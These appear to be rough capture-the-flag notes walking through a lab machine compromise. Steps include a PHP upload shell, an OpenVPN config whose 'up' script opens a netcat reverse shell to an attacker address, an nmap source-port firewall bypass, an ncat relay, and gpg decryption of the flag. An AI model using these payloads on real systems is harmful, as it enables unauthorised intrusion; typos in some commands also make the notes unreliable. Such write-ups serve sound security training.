we found a directory on main page which allowd php5 to be uloaded nad thus got a shell

now it begins

we got creds for dave and ssh

we did ping on ==internal network== and got a hit .. and got port 80 open

now it had a ==dns checkin==g input

```
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
nobind
```

we got root and user flag

on desktop we got dave password nad we ssh it

now on seeing we got new ip addr

so we did ==nmap== and 2 ports were closed ..maybe firewall?

so we used source port on it and found a new open port

`nmap 192.168.5.2 -Pn -f --source-port=4444`

```
/usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
ssh dave@localhost -p 1234
same password
```

we foundÂ  root.txt.==gpg== file

==gpg --list-keys== but no keys were found

so did

```
base32 -w0 root.txt.gpg
echo "" | bae32 -d > a.gpg
in /dev/shm
now we made a.gpg on every machine trying to open it 
 gpg -d a.gpg 
only on main machine we were able to open it and read the root file
```
